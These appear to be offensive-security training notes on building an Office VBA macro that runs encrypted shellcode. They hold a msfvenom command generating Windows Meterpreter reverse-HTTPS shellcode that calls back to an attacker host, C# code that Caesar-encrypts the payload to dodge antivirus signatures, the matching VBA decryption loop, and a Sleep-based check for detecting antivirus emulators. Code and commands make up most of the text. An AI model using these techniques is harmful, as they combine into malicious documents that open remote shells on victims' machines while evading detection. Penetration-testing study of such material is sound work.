Generate Shellcode

    sudo> msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication

We'll reuse the previous C# project to encrypt the shellcode and then copy the encrypted result into the VBA macro. For a VBA format, we'll use decimal values instead of hexadecimal. 

we need to generate VBA format shellcode and use it in our existing Casesar Cipher C# Helper program. 

Caesar cipher encryption routine:

    1   byte[] encoded = new byte[buf.Length];
    2   for(int i = 0; i < buf.Length; i++)
    3   {
    4     encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
    5   }
    6 
    7   uint counter = 0;
    8 
    9   StringBuilder hex = new StringBuilder(encoded.Length * 2);
    10  foreach(byte b in encoded)
    11  {
    12    hex.AppendFormat("{0:D}, ", b);
    13    counter++;
    14    if(counter % 50 == 0)
    15    {
    16        hex.AppendFormat("_{0}", Environment.NewLine);
    17    }
    18  }
    19  Console.WriteLine("The payload is: " + hex.ToString());

When executing the VBA shellcode runner(in Macro), we must also implement a decryption routine. 

    For i = 0 To UBound(buf)
    buf(i) = buf(i) - 2
    Next i

Using Sleep function to detect antivirus emulator:

    Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
    ...
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    
    If time < 2 Then
        Exit Function
    End If
    ...

    
